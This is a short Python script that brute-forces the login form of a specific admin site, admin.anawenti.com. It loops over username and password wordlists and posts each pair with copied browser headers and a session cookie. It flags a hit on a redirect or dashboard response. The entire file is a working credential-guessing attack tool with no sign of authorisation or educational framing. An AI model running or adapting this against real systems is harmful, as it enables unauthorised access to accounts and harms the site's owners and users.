import requests

url = "https://admin.anawenti.com/login/"

headers = {
    "Host": "admin.anawenti.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://admin.anawenti.com",
    "Referer": "https://admin.anawenti.com/login/",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

cookies = {
    "_ga_91VG6F62HD": "GS1.1.1745367466.4.0.1745367466.60.0.0",
    "_ga": "GA1.1.2068170135.1745330459",
    "_gcl_au": "1.1.797683589.1745330459.747705307.1745335796.1745335955",
    "session": "ospcf5gshk87k441jrul2fkb55g7jda514ju45dkjd1pfve2"
}

with open("/home/yossef/Desktop/hydra/usernames.txt", "r") as userfile, open("/home/yossef/Desktop/hydra/passwords.txt", "r") as passfile:
    usernames = userfile.read().splitlines()
    passwords = passfile.read().splitlines()

    for username in usernames:
        for password in passwords:
            data = {
                "username": username,
                "password": password,
                "login": ""
            }

            response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)

            print(f"[*] Trying: {username}:{password} | Status: {response.status_code}")

            if response.status_code == 302 or "dashboard" in response.text.lower():
                print(f"[+] FOUND => USER: {username} | PASS: {password}")
                exit()
